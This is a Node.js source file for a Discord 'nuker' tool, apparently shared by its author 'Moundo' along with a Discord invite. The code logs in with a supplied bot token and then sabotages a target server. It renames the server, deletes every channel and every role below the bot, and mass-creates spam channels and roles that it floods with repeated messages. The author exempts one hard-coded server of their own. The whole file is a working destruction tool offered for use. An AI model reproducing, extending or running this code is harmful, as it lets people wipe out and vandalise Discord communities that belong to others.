const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const chalk = require('chalk');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});




const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences,
    ]
});

console.log(chalk.green(`
███╗   ███╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗  ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
████╗ ████║██╔═══██╗██║   ██║████╗  ██║██╔══██╗██╔═══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██║  ██║██║   ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██║  ██║██║   ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝╚██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗
╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝  ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                                                               

 By: Moundo
 Dis: https://discord.gg/HCvq5d83ZU
`));

function askForToken() {
    rl.question(chalk.yellow(' - Enter Your Bot Token: '), (token) => {
        client.login(token).then(() => {
            console.log(chalk.green(' - Token is valid.'));
            // تغيير وصف البوت (Bot Presence)
            client.user.setPresence({
                activities: [{ name: 'NukerTool By Moundo: https://discord.gg/HCvq5d83ZU', type: 'PLAYING' }],
                status: 'online'
            });
            askForServerId();
        }).catch(() => {
            console.log(chalk.red(' - Token Invalid.'));
            askForToken(); // إعادة طلب التوكن في حالة الخطأ
        });
    });
}

function askForServerId() {
    rl.question(chalk.magenta(' - Enter The Server ID: '), (serverId) => {
        if (serverId === protectedServerId) {
            console.log(chalk.red('Error: This server ID is not allowed.'));
            process.exit(1);
        }

        rl.question(chalk.blue(' - Enter The Number of Channels to Create: '), (channelCount) => {
            rl.question(chalk.magenta(' - Enter The Name For The New Channels: '), (channelName) => {
                rl.question(chalk.cyan(' - Enter The New Server Name: '), (serverName) => {
                    rl.question(chalk.green(' - Enter The Number of Messages: '), (messageCount) => {
                        rl.question(chalk.red(' - Enter The Message To Spam: '), (spamMessage) => {
                            rl.question(chalk.yellow(' - Enter The Number of Roles to Create: '), (roleCount) => {
                                rl.question(chalk.blue(' - Enter The Name For The New Roles: '), (roleName) => {
                                    startNuke(serverId, channelCount, channelName, serverName, messageCount, spamMessage, roleCount, roleName);
                                });
                            });
                        });
                    });
                });
            });
        });
    });
}
const protectedServerId = '1099463270399750206'; 
async function startNuke(serverId, channelCount, channelName, serverName, messageCount, spamMessage, roleCount, roleName) {
    console.log(chalk.green(' - Nuke Start ☠☠☠☠☠'));

    const guild = client.guilds.cache.get(serverId);
    if (!guild) {
        console.log(chalk.red('Error: Server not found.'));
        process.exit(1);
    }

    // التحقق من صلاحية Administrator
    const botPermissions = guild.members.me.permissions;
    const isAdmin = botPermissions.has(PermissionsBitField.Flags.Administrator);

    if (isAdmin) {
        console.log(chalk.green(' - Bot has Administrator permissions.'));
    } else {
        console.log(chalk.yellow(' - Bot does not have Administrator permissions.'));
    }

    // تغيير اسم السيرفر (إذا كان لديه الصلاحية أو هو أدمن)
    if (isAdmin || botPermissions.has(PermissionsBitField.Flags.ManageGuild)) {
        await guild.setName(serverName).catch(console.error);
        console.log(chalk.blue(` - Server name changed to: ${serverName}`));
    } else {
        console.log(chalk.yellow(' - Missing permission to change server name.'));
    }

    // حذف جميع القنوات (إذا كان لديه الصلاحية أو هو أدمن)
    if (isAdmin || botPermissions.has(PermissionsBitField.Flags.ManageChannels)) {
        const deleteChannelPromises = guild.channels.cache.map(channel => channel.delete().catch(console.error));
        await Promise.all(deleteChannelPromises);
        console.log(chalk.blue(' - Deleted all existing channels'));
    } else {
        console.log(chalk.yellow(' - Missing permission to delete channels.'));
    }

    // إنشاء قنوات جديدة (إذا كان لديه الصلاحية أو هو أدمن)
    if (isAdmin || botPermissions.has(PermissionsBitField.Flags.ManageChannels)) {
        const createChannelPromises = [];
        for (let i = 0; i < channelCount; i++) {
            createChannelPromises.push(
                guild.channels.create({
                    name: channelName,
                    type: 0, // 0 = GUILD_TEXT
                }).then(channel => {
                    // إرسال الرسائل في القناة الجديدة
                    const sendMessagePromises = [];
                    for (let j = 0; j < messageCount; j++) {
                        sendMessagePromises.push(channel.send(spamMessage).catch(console.error));
                    }
                    return Promise.all(sendMessagePromises);
                }).catch(console.error)
            );
        }
        await Promise.all(createChannelPromises);
        console.log(chalk.blue(` - Created ${channelCount} channels and sent ${messageCount} messages in each`));
    } else {
        console.log(chalk.yellow(' - Missing permission to create channels.'));
    }


    if (isAdmin || botPermissions.has(PermissionsBitField.Flags.ManageRoles)) {
        const botRolePosition = guild.members.me.roles.highest.position;
        const deleteRolePromises = guild.roles.cache
            .filter(role => role.name !== '@everyone' && role.position < botRolePosition)
            .map(role => role.delete().catch(console.error));
        await Promise.all(deleteRolePromises);
        console.log(chalk.blue(' - Deleted all existing roles'));
    } else {
        console.log(chalk.yellow(' - Missing permission to delete roles.'));
    }



    if (isAdmin || botPermissions.has(PermissionsBitField.Flags.ManageRoles)) {
        const colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF', '#FF00FF', '#FFA500', '#800080', '#008000', '#000080'];
        const createRolePromises = [];
        for (let i = 0; i < roleCount; i++) {
            const randomColor = colors[Math.floor(Math.random() * colors.length)];
            createRolePromises.push(
                guild.roles.create({
                    name: roleName,
                    color: randomColor,
                }).catch(console.error)
            );
        }
        await Promise.all(createRolePromises);
        console.log(chalk.blue(` - Created ${roleCount} roles with random colors`));
    } else {
        console.log(chalk.yellow(' - Missing permission to create roles.'));
    }

    console.log(chalk.green(' - Nuke completed!'));
    process.exit(0);
}

askForToken();